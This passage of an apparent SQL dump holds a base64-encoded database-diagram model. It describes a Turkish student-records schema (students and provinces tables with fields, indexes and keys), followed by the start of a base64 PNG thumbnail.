CQkJCQk8Q2hhbmdlcyB2YWx1ZT0iIi8+CgkJCQkJCQk8UHJvcGVydGllcz4KCQkJCQkJCQk8QXV0b2luY3JlbWVudCB2YWx1ZT0iMCIvPgoJCQkJCQkJCTxDaGFyc2V0IHZhbHVlPSJ1dGY4Ii8+CgkJCQkJCQkJPENvbGxhdGlvbiB2YWx1ZT0idXRmOF90dXJraXNoX2NpIi8+CgkJCQkJCQkJPENvbW1lbnQgdmFsdWU9IkUsSywgRyhHaXJpbG1lbWnFnykiLz4KCQkJCQkJCQk8RGVmYXVsdF9WYWx1ZSB2YWx1ZT0iRyIvPgoJCQkJCQkJCTxGaWVsZF9Qb3NpdGlvbiB2YWx1ZT0iMTUiLz4KCQkJCQkJCQk8SW5kZXhlZCB2YWx1ZT0iMCIvPgoJCQkJCQkJCTxMZW5ndGggdmFsdWU9IjEiLz4KCQkJCQkJCQk8TmFtZSB2YWx1ZT0iY2luc2l5ZXQiLz4KCQkJCQkJCQk8TnVsbGFibGUgdmFsdWU9IjEiLz4KCQkJCQkJCQk8T25fVXBkYXRlX1NldF9DdXJyZW50IHZhbHVlPSIwIi8+CgkJCQkJCQkJPFByZWNpc2lvbiB2YWx1ZT0iMCIvPgoJCQkJCQkJCTxTY2FsZSB2YWx1ZT0iMCIvPgoJCQkJCQkJCTxUeXBlIHZhbHVlPSJDaGFyIi8+CgkJCQkJCQkJPFVuaXF1ZSB2YWx1ZT0iMCIvPgoJCQkJCQkJCTxVbnNpZ25lZCB2YWx1ZT0iMCIvPgoJCQkJCQkJCTxaZXJvZmlsbCB2YWx1ZT0iMCIvPgoJCQkJCQkJPC9Qcm9wZXJ0aWVzPgoJCQkJCQkJPGNvbnRyb2wgdmFsdWU9IiIvPgoJCQkJCQkJPGRlbGV0ZSB2YWx1ZT0iMCIvPgoJCQkJCQkJPG5hbWUgdmFsdWU9ImNpbnNpeWV0Ii8+CgkJCQkJCTwvbzU+CgkJCQkJCTxvNj4KCQkJCQkJCTxDaGFuZ2VzIHZhbHVlPSIiLz4KCQkJCQkJCTxQcm9wZXJ0aWVzPgoJCQkJCQkJCTxBdXRvaW5jcmVtZW50IHZhbHVlPSIwIi8+CgkJCQkJCQkJPENoYXJzZXQgdmFsdWU9IiIvPgoJCQkJCQkJCTxDb2xsYXRpb24gdmFsdWU9IiIvPgoJCQkJCQkJCTxDb21tZW50IHZhbHVlPSIiLz4KCQkJCQkJCQk8RGVmYXVsdF9WYWx1ZSB2YWx1ZT0iIi8+CgkJCQkJCQkJPEZpZWxkX1Bvc2l0aW9uIHZhbHVlPSI5Ii8+CgkJCQkJCQkJPEluZGV4ZWQgdmFsdWU9IjAiLz4KCQkJCQkJCQk8TGVuZ3RoIHZhbHVlPSItMSIvPgoJCQkJCQkJCTxOYW1lIHZhbHVlPSJkb2d1bVRhcmloaSIvPgoJCQkJCQkJCTxOdWxsYWJsZSB2YWx1ZT0iMSIvPgoJCQkJCQkJCTxPbl9VcGRhdGVfU2V0X0N1cnJlbnQgdmFsdWU9IjAiLz4KCQkJCQkJCQk8UHJlY2lzaW9uIHZhbHVlPSIwIi8+CgkJCQkJCQkJPFNjYWxlIHZhbHVlPSIwIi8+CgkJCQkJCQkJPFR5cGUgdmFsdWU9IkRhdGUiLz4KCQkJCQkJCQk8VW5pcXVlIHZhbHVlPSIwIi8+CgkJCQkJCQkJPFVuc2lnbmVkIHZhbHVlPSIwIi8+CgkJCQkJCQkJPFplcm9maWxsIHZhbHVlPSIwIi8+CgkJCQkJCQk8L1Byb3BlcnRpZXM+CgkJCQkJCQk8Y29udHJvbCB2YWx1ZT0iIi8+CgkJCQkJCQk8ZGVsZXRlIHZhbHVlPSIwIi8+CgkJCQkJCQk8bmFtZSB2YWx1ZT0iZG9ndW1UYXJpaGkiLz4KCQkJCQkJPC9vNj4KCQkJCQkJPG83PgoJCQkJCQkJPENoYW5nZXMgdmFsdWU9IiIvPgoJCQkJCQkJPFByb3BlcnRpZXM+CgkJCQkJCQkJPEF1dG9pbmNyZW1lbnQgdmFsdWU9IjAiLz4KCQkJCQkJCQk8Q2hhcnNldCB2YWx1ZT0idXRmOCIvPgoJCQkJCQkJCTxDb2xsYXRpb24gdmFsdWU9InV0ZjhfdHVya2lzaF9jaSIvPgoJCQkJCQkJCTxDb21tZW50IHZhbHVlPSIiLz4KCQkJCQkJCQk8RGVmYXVsdF9WYWx1ZSB2YWx1ZT0iR2lyaWxtZW1pxZ8iLz4KCQkJCQkJCQk8RmllbGRfUG9zaXRpb24gdmFsdWU9IjYiLz4KCQkJCQkJCQk8SW5kZXhlZCB2YWx1ZT0iMCIvPgoJCQkJCQkJCTxMZW5ndGggdmFsdWU9IjUwIi8+CgkJCQkJCQkJPE5hbWUgdmFsdWU9ImVwb3N0YSIvPgoJCQkJCQkJCTxOdWxsYWJsZSB2YWx1ZT0iMSIvPgoJCQkJCQkJCTxPbl9VcGRhdGVfU2V0X0N1cnJlbnQgdmFsdWU9IjAiLz4KCQkJCQkJCQk8UHJlY2lzaW9uIHZhbHVlPSIwIi8+CgkJCQkJCQkJPFNjYWxlIHZhbHVlPSIwIi8+CgkJCQkJCQkJPFR5cGUgdmFsdWU9IlZhckNoYXIiLz4KCQkJCQkJCQk8VW5pcXVlIHZhbHVlPSIwIi8+CgkJCQkJCQkJPFVuc2lnbmVkIHZhbHVlPSIwIi8+CgkJCQkJCQkJPFplcm9maWxsIHZhbHVlPSIwIi8+CgkJCQkJCQk8L1Byb3BlcnRpZXM+CgkJCQkJCQk8Y29udHJvbCB2YWx1ZT0iIi8+CgkJCQkJCQk8ZGVsZXRlIHZhbHVlPSIwIi8+CgkJCQkJCQk8bmFtZSB2YWx1ZT0iZXBvc3RhIi8+CgkJCQkJCTwvbzc+CgkJCQkJCTxvOD4KCQkJCQkJCTxDaGFuZ2VzIHZhbHVlPSIiLz4KCQkJCQkJCTxQcm9wZXJ0aWVzPgoJCQkJCQkJCTxBdXRvaW5jcmVtZW50IHZhbHVlPSIwIi8+CgkJCQkJCQkJPENoYXJzZXQgdmFsdWU9InV0ZjgiLz4KCQkJCQkJCQk8Q29sbGF0aW9uIHZhbHVlPSJ1dGY4X3R1cmtpc2hfY2kiLz4KCQkJCQkJCQk8Q29tbWVudCB2YWx1ZT0iIi8+CgkJCQkJCQkJPERlZmF1bHRfVmFsdWUgdmFsdWU9IjAwIi8+CgkJCQkJCQkJPEZpZWxkX1Bvc2l0aW9uIHZhbHVlPSIxMCIvPgoJCQkJCQkJCTxJbmRleGVkIHZhbHVlPSIxIi8+CgkJCQkJCQkJPExlbmd0aCB2YWx1ZT0iMiIvPgoJCQkJCQkJCTxOYW1lIHZhbHVlPSJpbCIvPgoJCQkJCQkJCTxOdWxsYWJsZSB2YWx1ZT0iMSIvPgoJCQkJCQkJCTxPbl9VcGRhdGVfU2V0X0N1cnJlbnQgdmFsdWU9IjAiLz4KCQkJCQkJCQk8UHJlY2lzaW9uIHZhbHVlPSIwIi8+CgkJCQkJCQkJPFNjYWxlIHZhbHVlPSIwIi8+CgkJCQkJCQkJPFR5cGUgdmFsdWU9IkNoYXIiLz4KCQkJCQkJCQk8VW5pcXVlIHZhbHVlPSIwIi8+CgkJCQkJCQkJPFVuc2lnbmVkIHZhbHVlPSIwIi8+CgkJCQkJCQkJPFplcm9maWxsIHZhbHVlPSIwIi8+CgkJCQkJCQk8L1Byb3BlcnRpZXM+CgkJCQkJCQk8Y29udHJvbCB2YWx1ZT0iIi8+CgkJCQkJCQk8ZGVsZXRlIHZhbHVlPSIwIi8+CgkJCQkJCQk8bmFtZSB2YWx1ZT0iaWwiLz4KCQkJCQkJPC9vOD4KCQkJCQkJPG85PgoJCQkJCQkJPENoYW5nZXMgdmFsdWU9IiIvPgoJCQkJCQkJPFByb3BlcnRpZXM+CgkJCQkJCQkJPEF1dG9pbmNyZW1lbnQgdmFsdWU9IjAiLz4KCQkJCQkJCQk8Q2hhcnNldCB2YWx1ZT0iIi8+CgkJCQkJCQkJPENvbGxhdGlvbiB2YWx1ZT0iIi8+CgkJCQkJCQkJPENvbW1lbnQgdmFsdWU9IiIvPgoJCQkJCQkJCTxEZWZhdWx0X1ZhbHVlIHZhbHVlPSI5NDAiLz4KCQkJCQkJCQk8RmllbGRfUG9zaXRpb24gdmFsdWU9IjExIi8+CgkJCQkJCQkJPEluZGV4ZWQgdmFsdWU9IjEiLz4KCQkJCQkJCQk8TGVuZ3RoIHZhbHVlPSIzIi8+CgkJCQkJCQkJPE5hbWUgdmFsdWU9ImlsY2UiLz4KCQkJCQkJCQk8TnVsbGFibGUgdmFsdWU9IjEiLz4KCQkJCQkJCQk8T25fVXBkYXRlX1NldF9DdXJyZW50IHZhbHVlPSIwIi8+CgkJCQkJCQkJPFByZWNpc2lvbiB2YWx1ZT0iNSIvPgoJCQkJCQkJCTxTY2FsZSB2YWx1ZT0iMCIvPgoJCQkJCQkJCTxUeXBlIHZhbHVlPSJTbWFsbGludCIvPgoJCQkJCQkJCTxVbmlxdWUgdmFsdWU9IjAiLz4KCQkJCQkJCQk8VW5zaWduZWQgdmFsdWU9IjEiLz4KCQkJCQkJCQk8WmVyb2ZpbGwgdmFsdWU9IjEiLz4KCQkJCQkJCTwvUHJvcGVydGllcz4KCQkJCQkJCTxjb250cm9sIHZhbHVlPSIiLz4KCQkJCQkJCTxkZWxldGUgdmFsdWU9IjAiLz4KCQkJCQkJCTxuYW1lIHZhbHVlPSJpbGNlIi8+CgkJCQkJCTwvbzk+CgkJCQkJPC9maWVsZD4KCQkJCQk8aW5kZXg+CgkJCQkJCTxvMD4KCQkJCQkJCTxDaGFuZ2VzIHZhbHVlPSIiLz4KCQkJCQkJCTxQcm9wZXJ0aWVzPgoJCQkJCQkJCTxDb21tZW50IHZhbHVlPSIiLz4KCQkJCQkJCQk8RmllbGRzIHZhbHVlPSJZV1JwIi8+CgkJCQkJCQkJPE5hbWUgdmFsdWU9ImFkaSIvPgoJCQkJCQkJCTxUeXBlIHZhbHVlPSJCVFJFRSIvPgoJCQkJCQkJCTxVbmlxdWUgdmFsdWU9IjAiLz4KCQkJCQkJCTwvUHJvcGVydGllcz4KCQkJCQkJCTxjb250cm9sIHZhbHVlPSIiLz4KCQkJCQkJCTxkZWxldGUgdmFsdWU9IjAiLz4KCQkJCQkJCTxuYW1lIHZhbHVlPSJhZGkiLz4KCQkJCQkJPC9vMD4KCQkJCQkJPG8xPgoJCQkJCQkJPENoYW5nZXMgdmFsdWU9IiIvPgoJCQkJCQkJPFByb3BlcnRpZXM+CgkJCQkJCQkJPENvbW1lbnQgdmFsdWU9IiIvPgoJCQkJCQkJCTxGaWVsZHMgdmFsdWU9ImEyRjVhWFJVWVhKcGFHaz0iLz4KCQkJCQkJCQk8TmFtZSB2YWx1ZT0iZGFuaXNtYW4iLz4KCQkJCQkJCQk8VHlwZSB2YWx1ZT0iQlRSRUUiLz4KCQkJCQkJCQk8VW5pcXVlIHZhbHVlPSIwIi8+CgkJCQkJCQk8L1Byb3BlcnRpZXM+CgkJCQkJCQk8Y29udHJvbCB2YWx1ZT0iIi8+CgkJCQkJCQk8ZGVsZXRlIHZhbHVlPSIwIi8+CgkJCQkJCQk8bmFtZSB2YWx1ZT0iZGFuaXNtYW4iLz4KCQkJCQkJPC9vMT4KCQkJCQkJPG8yPgoJCQkJCQkJPENoYW5nZXMgdmFsdWU9IiIvPgoJCQkJCQkJPFByb3BlcnRpZXM+CgkJCQkJCQkJPENvbW1lbnQgdmFsdWU9IiIvPgoJCQkJCQkJCTxGaWVsZHMgdmFsdWU9ImFXeGpaUT09Ii8+CgkJCQkJCQkJPE5hbWUgdmFsdWU9IkZLX29ncmVuY2lsZXIiLz4KCQkJCQkJCQk8VHlwZSB2YWx1ZT0iQlRSRUUiLz4KCQkJCQkJCQk8VW5pcXVlIHZhbHVlPSIwIi8+CgkJCQkJCQk8L1Byb3BlcnRpZXM+CgkJCQkJCQk8Y29udHJvbCB2YWx1ZT0iIi8+CgkJCQkJCQk8ZGVsZXRlIHZhbHVlPSIwIi8+CgkJCQkJCQk8bmFtZSB2YWx1ZT0iRktfb2dyZW5jaWxlciIvPgoJCQkJCQk8L28yPgoJCQkJCQk8bzM+CgkJCQkJCQk8Q2hhbmdlcyB2YWx1ZT0iIi8+CgkJCQkJCQk8UHJvcGVydGllcz4KCQkJCQkJCQk8Q29tbWVudCB2YWx1ZT0iIi8+CgkJCQkJCQkJPEZpZWxkcyB2YWx1ZT0iYjJkeVpXNXBiVVIxY25WdGRRPT0iLz4KCQkJCQkJCQk8TmFtZSB2YWx1ZT0iRktfb2dyZW5jaWxlcl9vZ3JlbmltZHVydW11Ii8+CgkJCQkJCQkJPFR5cGUgdmFsdWU9IkJUUkVFIi8+CgkJCQkJCQkJPFVuaXF1ZSB2YWx1ZT0iMCIvPgoJCQkJCQkJPC9Qcm9wZXJ0aWVzPgoJCQkJCQkJPGNvbnRyb2wgdmFsdWU9IiIvPgoJCQkJCQkJPGRlbGV0ZSB2YWx1ZT0iMCIvPgoJCQkJCQkJPG5hbWUgdmFsdWU9IkZLX29ncmVuY2lsZXJfb2dyZW5pbWR1cnVtdSIvPgoJCQkJCQk8L28zPgoJCQkJCQk8bzQ+CgkJCQkJCQk8Q2hhbmdlcyB2YWx1ZT0iIi8+CgkJCQkJCQk8UHJvcGVydGllcz4KCQkJCQkJCQk8Q29tbWVudCB2YWx1ZT0iIi8+CgkJCQkJCQkJPEZpZWxkcyB2YWx1ZT0iZW1GdFlXNUVhV3hwYldrPSIvPgoJCQkJCQkJCTxOYW1lIHZhbHVlPSJGS19vZ3JlbmNpbGVyX3phbWFuZGlsaW1pIi8+CgkJCQkJCQkJPFR5cGUgdmFsdWU9IkJUUkVFIi8+CgkJCQkJCQkJPFVuaXF1ZSB2YWx1ZT0iMCIvPgoJCQkJCQkJPC9Qcm9wZXJ0aWVzPgoJCQkJCQkJPGNvbnRyb2wgdmFsdWU9IiIvPgoJCQkJCQkJPGRlbGV0ZSB2YWx1ZT0iMCIvPgoJCQkJCQkJPG5hbWUgdmFsdWU9IkZLX29ncmVuY2lsZXJfemFtYW5kaWxpbWkiLz4KCQkJCQkJPC9vND4KCQkJCQkJPG81PgoJCQkJCQkJPENoYW5nZXMgdmFsdWU9IiIvPgoJCQkJCQkJPFByb3BlcnRpZXM+CgkJCQkJCQkJPENvbW1lbnQgdmFsdWU9IiIvPgoJCQkJCQkJCTxGaWVsZHMgdmFsdWU9ImFXdz0iLz4KCQkJCQkJCQk8TmFtZSB2YWx1ZT0iaWwiLz4KCQkJCQkJCQk8VHlwZSB2YWx1ZT0iQlRSRUUiLz4KCQkJCQkJCQk8VW5pcXVlIHZhbHVlPSIwIi8+CgkJCQkJCQk8L1Byb3BlcnRpZXM+CgkJCQkJCQk8Y29udHJvbCB2YWx1ZT0iIi8+CgkJCQkJCQk8ZGVsZXRlIHZhbHVlPSIwIi8+CgkJCQkJCQk8bmFtZSB2YWx1ZT0iaWwiLz4KCQkJCQkJPC9vNT4KCQkJCQkJPG82PgoJCQkJCQkJPENoYW5nZXMgdmFsdWU9IiIvPgoJCQkJCQkJPFByb3BlcnRpZXM+CgkJCQkJCQkJPENvbW1lbnQgdmFsdWU9IiIvPgoJCQkJCQkJCTxGaWVsZHMgdmFsdWU9ImIyZHlaVzVqYVU1diIvPgoJCQkJCQkJCTxOYW1lIHZhbHVlPSJQUklNQVJZIi8+CgkJCQkJCQkJPFR5cGUgdmFsdWU9IkJUUkVFIi8+CgkJCQkJCQkJPFVuaXF1ZSB2YWx1ZT0iMSIvPgoJCQkJCQkJPC9Qcm9wZXJ0aWVzPgoJCQkJCQkJPGNvbnRyb2wgdmFsdWU9IiIvPgoJCQkJCQkJPGRlbGV0ZSB2YWx1ZT0iMCIvPgoJCQkJCQkJPG5hbWUgdmFsdWU9IlBSSU1BUlkiLz4KCQkJCQkJPC9vNj4KCQkJCQkJPG83PgoJCQkJCQkJPENoYW5nZXMgdmFsdWU9IiIvPgoJCQkJCQkJPFByb3BlcnRpZXM+CgkJCQkJCQkJPENvbW1lbnQgdmFsdWU9IiIvPgoJCQkJCQkJCTxGaWVsZHMgdmFsdWU9ImMyOTVZV1JwIi8+CgkJCQkJCQkJPE5hbWUgdmFsdWU9InNveWFkaSIvPgoJCQkJCQkJCTxUeXBlIHZhbHVlPSJCVFJFRSIvPgoJCQkJCQkJCTxVbmlxdWUgdmFsdWU9IjAiLz4KCQkJCQkJCTwvUHJvcGVydGllcz4KCQkJCQkJCTxjb250cm9sIHZhbHVlPSIiLz4KCQkJCQkJCTxkZWxldGUgdmFsdWU9IjAiLz4KCQkJCQkJCTxuYW1lIHZhbHVlPSJzb3lhZGkiLz4KCQkJCQkJPC9vNz4KCQkJCQk8L2luZGV4PgoJCQkJCTxuYW1lIHZhbHVlPSJvZ3JlbmNpbGVyIi8+CgkJCQkJPHVuaXF1ZT4KCQkJCQkJPG8wPgoJCQkJCQkJPENoYW5nZXMgdmFsdWU9IiIvPgoJCQkJCQkJPFByb3BlcnRpZXM+CgkJCQkJCQkJPEZpZWxkcyB2YWx1ZT0iYjJkeVpXNWphVTV2Ii8+CgkJCQkJCQkJPE5hbWUgdmFsdWU9IlBSSU1BUlkiLz4KCQkJCQkJCTwvUHJvcGVydGllcz4KCQkJCQkJCTxjb250cm9sIHZhbHVlPSIiLz4KCQkJCQkJCTxkZWxldGUgdmFsdWU9IjAiLz4KCQkJCQkJCTxuYW1lIHZhbHVlPSJQUklNQVJZIi8+CgkJCQkJCTwvbzA+CgkJCQkJPC91bmlxdWU+CgkJCQk8L28wPgoJCQkJPG8xPgoJCQkJCTxDaGFuZ2VzIHZhbHVlPSIiLz4KCQkJCQk8UHJvcGVydGllcz4KCQkJCQkJPEF1dG9pbmNyZW1lbnQgdmFsdWU9IjAiLz4KCQkJCQkJPEF2ZXJhZ2VfUm93X1NpemUgdmFsdWU9IjE5OSIvPgoJCQkJCQk8Q2hhcnNldCB2YWx1ZT0idXRmOCIvPgoJCQkJCQk8Q29sbGF0aW9uIHZhbHVlPSJ1dGY4X3R1cmtpc2hfY2kiLz4KCQkJCQkJPENvbW1lbnQgdmFsdWU9IiIvPgoJCQkJCQk8Q3JlYXRlX1RpbWUgdmFsdWU9IjIwMTUtMDItMTYgMTU6NTU6NTYiLz4KCQkJCQkJPEVuZ2luZSB2YWx1ZT0iSW5ub0RCIi8+CgkJCQkJCTxGaWVsZF9Db3VudCB2YWx1ZT0iMiIvPgoJCQkJCQk8SW5kZXhfQ291bnQgdmFsdWU9IjEiLz4KCQkJCQkJPExpbmtfQ291bnQgdmFsdWU9IjMiLz4KCQkJCQkJPE5hbWUgdmFsdWU9ImlsbGVyIi8+CgkJCQkJCTxQcmltYXJ5X0tleSB2YWx1ZT0iYVd4TGIyUjEiLz4KCQkJCQkJPFJlY29yZF9Db3VudCB2YWx1ZT0iODIiLz4KCQkJCQkJPFNpemUgdmFsdWU9IjE2LjAwIEtiIi8+CgkJCQkJCTxUcmlnZ2VyX0NvdW50IHZhbHVlPSIwIi8+CgkJCQkJCTxVbmlxdWVfQ291bnQgdmFsdWU9IjEiLz4KCQkJCQkJPFVwZGF0ZV9UaW1lIHZhbHVlPSIiLz4KCQkJCQk8L1Byb3BlcnRpZXM+CgkJCQkJPGNvbnRyb2wgdmFsdWU9IlRhYmxlMSIvPgoJCQkJCTxkZWxldGUgdmFsdWU9IjAiLz4KCQkJCQk8ZmllbGQ+CgkJCQkJCTxvMD4KCQkJCQkJCTxDaGFuZ2VzIHZhbHVlPSIiLz4KCQkJCQkJCTxQcm9wZXJ0aWVzPgoJCQkJCQkJCTxBdXRvaW5jcmVtZW50IHZhbHVlPSIwIi8+CgkJCQkJCQkJPENoYXJzZXQgdmFsdWU9InV0ZjgiLz4KCQkJCQkJCQk8Q29sbGF0aW9uIHZhbHVlPSJ1dGY4X3R1cmtpc2hfY2kiLz4KCQkJCQkJCQk8Q29tbWVudCB2YWx1ZT0iIi8+CgkJCQkJCQkJPERlZmF1bHRfVmFsdWUgdmFsdWU9IiIvPgoJCQkJCQkJCTxGaWVsZF9Qb3NpdGlvbiB2YWx1ZT0iMiIvPgoJCQkJCQkJCTxJbmRleGVkIHZhbHVlPSIwIi8+CgkJCQkJCQkJPExlbmd0aCB2YWx1ZT0iMjAiLz4KCQkJCQkJCQk8TmFtZSB2YWx1ZT0iaWxBZGkiLz4KCQkJCQkJCQk8TnVsbGFibGUgdmFsdWU9IjAiLz4KCQkJCQkJCQk8T25fVXBkYXRlX1NldF9DdXJyZW50IHZhbHVlPSIwIi8+CgkJCQkJCQkJPFByZWNpc2lvbiB2YWx1ZT0iMCIvPgoJCQkJCQkJCTxTY2FsZSB2YWx1ZT0iMCIvPgoJCQkJCQkJCTxUeXBlIHZhbHVlPSJWYXJDaGFyIi8+CgkJCQkJCQkJPFVuaXF1ZSB2YWx1ZT0iMCIvPgoJCQkJCQkJCTxVbnNpZ25lZCB2YWx1ZT0iMCIvPgoJCQkJCQkJCTxaZXJvZmlsbCB2YWx1ZT0iMCIvPgoJCQkJCQkJPC9Qcm9wZXJ0aWVzPgoJCQkJCQkJPGNvbnRyb2wgdmFsdWU9IiIvPgoJCQkJCQkJPGRlbGV0ZSB2YWx1ZT0iMCIvPgoJCQkJCQkJPG5hbWUgdmFsdWU9ImlsQWRpIi8+CgkJCQkJCTwvbzA+CgkJCQkJCTxvMT4KCQkJCQkJCTxDaGFuZ2VzIHZhbHVlPSIiLz4KCQkJCQkJCTxQcm9wZXJ0aWVzPgoJCQkJCQkJCTxBdXRvaW5jcmVtZW50IHZhbHVlPSIwIi8+CgkJCQkJCQkJPENoYXJzZXQgdmFsdWU9InV0ZjgiLz4KCQkJCQkJCQk8Q29sbGF0aW9uIHZhbHVlPSJ1dGY4X3R1cmtpc2hfY2kiLz4KCQkJCQkJCQk8Q29tbWVudCB2YWx1ZT0iIi8+CgkJCQkJCQkJPERlZmF1bHRfVmFsdWUgdmFsdWU9IiIvPgoJCQkJCQkJCTxGaWVsZF9Qb3NpdGlvbiB2YWx1ZT0iMSIvPgoJCQkJCQkJCTxJbmRleGVkIHZhbHVlPSIxIi8+CgkJCQkJCQkJPExlbmd0aCB2YWx1ZT0iMiIvPgoJCQkJCQkJCTxOYW1lIHZhbHVlPSJpbEtvZHUiLz4KCQkJCQkJCQk8TnVsbGFibGUgdmFsdWU9IjAiLz4KCQkJCQkJCQk8T25fVXBkYXRlX1NldF9DdXJyZW50IHZhbHVlPSIwIi8+CgkJCQkJCQkJPFByZWNpc2lvbiB2YWx1ZT0iMCIvPgoJCQkJCQkJCTxTY2FsZSB2YWx1ZT0iMCIvPgoJCQkJCQkJCTxUeXBlIHZhbHVlPSJDaGFyIi8+CgkJCQkJCQkJPFVuaXF1ZSB2YWx1ZT0iMSIvPgoJCQkJCQkJCTxVbnNpZ25lZCB2YWx1ZT0iMCIvPgoJCQkJCQkJCTxaZXJvZmlsbCB2YWx1ZT0iMCIvPgoJCQkJCQkJPC9Qcm9wZXJ0aWVzPgoJCQkJCQkJPGNvbnRyb2wgdmFsdWU9IiIvPgoJCQkJCQkJPGRlbGV0ZSB2YWx1ZT0iMCIvPgoJCQkJCQkJPG5hbWUgdmFsdWU9ImlsS29kdSIvPgoJCQkJCQk8L28xPgoJCQkJCTwvZmllbGQ+CgkJCQkJPGluZGV4PgoJCQkJCQk8bzA+CgkJCQkJCQk8Q2hhbmdlcyB2YWx1ZT0iIi8+CgkJCQkJCQk8UHJvcGVydGllcz4KCQkJCQkJCQk8Q29tbWVudCB2YWx1ZT0iIi8+CgkJCQkJCQkJPEZpZWxkcyB2YWx1ZT0iYVd4TGIyUjEiLz4KCQkJCQkJCQk8TmFtZSB2YWx1ZT0iUFJJTUFSWSIvPgoJCQkJCQkJCTxUeXBlIHZhbHVlPSJCVFJFRSIvPgoJCQkJCQkJCTxVbmlxdWUgdmFsdWU9IjEiLz4KCQkJCQkJCTwvUHJvcGVydGllcz4KCQkJCQkJCTxjb250cm9sIHZhbHVlPSIiLz4KCQkJCQkJCTxkZWxldGUgdmFsdWU9IjAiLz4KCQkJCQkJCTxuYW1lIHZhbHVlPSJQUklNQVJZIi8+CgkJCQkJCTwvbzA+CgkJCQkJPC9pbmRleD4KCQkJCQk8bmFtZSB2YWx1ZT0iaWxsZXIiLz4KCQkJCQk8dW5pcXVlPgoJCQkJCQk8bzA+CgkJCQkJCQk8Q2hhbmdlcyB2YWx1ZT0iIi8+CgkJCQkJCQk8UHJvcGVydGllcz4KCQkJCQkJCQk8RmllbGRzIHZhbHVlPSJhV3hMYjJSMSIvPgoJCQkJCQkJCTxOYW1lIHZhbHVlPSJQUklNQVJZIi8+CgkJCQkJCQk8L1Byb3BlcnRpZXM+CgkJCQkJCQk8Y29udHJvbCB2YWx1ZT0iIi8+CgkJCQkJCQk8ZGVsZXRlIHZhbHVlPSIwIi8+CgkJCQkJCQk8bmFtZSB2YWx1ZT0iUFJJTUFSWSIvPgoJCQkJCQk8L28wPgoJCQkJCTwvdW5pcXVlPgoJCQkJPC9vMT4KCQkJPC90YWJsZT4KCQk8L29iPgoJPC9Nb2RlbD4KPC9wcm9wZXJ0aWVzPgoK', NULL, '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